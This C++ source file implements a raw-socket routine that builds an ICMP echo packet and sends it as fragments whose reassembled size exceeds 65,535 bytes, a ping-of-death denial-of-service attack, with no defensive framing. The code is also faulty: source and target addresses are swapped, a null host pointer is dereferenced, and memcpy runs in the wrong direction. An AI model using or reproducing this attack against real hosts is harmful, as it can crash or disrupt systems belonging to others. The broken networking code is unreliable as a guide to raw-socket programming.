#include "ndp_socket.hpp"

#include <netdb.h>
#include <stdio.h>

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include <arpa/inet.h>

#include <cstring>
#include <stdexcept>

void ndp(const char* srcAddr, const char* tgtAddr)
{
    char buf[400] = { 0 };

    struct ip* ip = (struct ip*) buf;

    // Create RAW socket
    int sfd;
    if((sfd = ::socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
        throw std::runtime_error("");
    }

    // socket options, tell the kernel we provide the IP structure
    int opt = 1;
    if(::setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        throw std::runtime_error("");
    }

    struct hostent* hp;
    if((hp = gethostbyname(tgtAddr)) == nullptr)
    {
        int n;
        if ((n = ::inet_addr(srcAddr)) == -1) {
            throw std::runtime_error("");
        }

        else {
            ip->ip_dst.s_addr = n;
        }
    }

    ::memcpy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);

    // The following source address just redundant for target to collect
    if((hp = gethostbyname(srcAddr)) == nullptr)
    {
        int n;
        if ((n = ::inet_addr(tgtAddr)) == -1) {
            throw std::runtime_error("");
        }

        else {
            ip->ip_src.s_addr = n;
        }
    }

    ::memcpy(hp->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);

    struct icmphdr* icmp = (struct icmphdr*)(ip + 1);

    struct sockaddr_in dst;

     // Build ip header

    ip->ip_v = 4;
    ip->ip_hl = sizeof *ip >> 2;

    ip->ip_tos = 0;
    ip->ip_len = ::htons(sizeof(buf));
    ip->ip_id = ::htons(4321);
    ip->ip_off = ::htons(0);
    ip->ip_ttl = 255;
    ip->ip_p = 1;
    ip->ip_sum = 0; // Let the kernel fill it in

    dst.sin_addr = ip->ip_dst;
    dst.sin_family = AF_INET;

    icmp->type = ICMP_ECHO;
    icmp->code = 0;

    // Header checksum
    icmp->checksum = ::htons(~(ICMP_ECHO << 8));

    for(int offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip)))
    {
        ip->ip_off = htons(offset >> 3);

        if(offset < 65120) {
            ip->ip_off |= htons(0x2000);
        }

        else {
            ip->ip_len = htons(418); // Make total 65538
        }

        // Sending time
        if(sendto(sfd, buf, sizeof(buf), 0, (struct sockaddr* )&dst, sizeof(dst)) < 0)
        {
            fprintf(stderr, "offset %d: ", offset);
            perror("sendto() error");
        }

        else
        {
            printf("sendto() is OK.\n");
        }

        // If offset = 0, define our ICMP structure
        if(offset == 0)
        {
            icmp->type = 0;
            icmp->code = 0;
            icmp->checksum = 0;
        }
    }
}
